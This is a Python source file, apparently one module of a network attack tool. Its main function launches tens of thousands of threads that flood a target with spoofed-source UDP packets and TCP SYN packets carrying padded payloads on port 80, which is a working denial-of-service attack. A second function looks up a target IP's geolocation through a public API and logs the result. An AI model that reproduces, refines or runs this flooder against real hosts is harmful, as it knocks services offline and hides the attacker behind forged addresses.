import ctypes, threading, random, requests
from colorama import Fore
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.l2 import Ether


#Packet initialization 
def send(target, output, count):
    ctypes.windll.kernel32.SetConsoleTitleW("Sending packets...")
    
    def attack(target, output, count):
        try:
            for fake_port in range(1, 65535):
                fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                udp = sendp(Ether(src="aa:bb:cc:dd:ee:ff")/IP(src = fake_ip, dst = target, ttl = 255)/UDP(sport = fake_port, dport = 80), verbose=output, count=count)
                tcp = sendp(IP(src = fake_ip, dst = target)/TCP(sport=RandShort(), dport = 80, flags="S")/Raw(load = b"X"*1024), verbose=output, count=count)
                
        except Exception as e:
            print(f"{Fore.RED}[!] Error while sending packets: {e}")
            
    for i in range(1, 65535):
        send_thread = threading.Thread(target=attack, args=(target, output, count))
        send_thread.daemon = True
        send_thread.start()
        
        
def query(ip):
    ip = str(ip)
    get = requests.get(f"http://ip-api.com/json/{ip}")

    everything = str(get.json())
    if not os.path.exists(f"{os.getcwd()}/output"):
                    os.makedirs(f"{os.getcwd()}/output")
                    
    open(f"{os.getcwd()}/output/ipinfo.txt", "a+").write(everything)
    print(everything)
    from functions.commands import cmd
    cmd()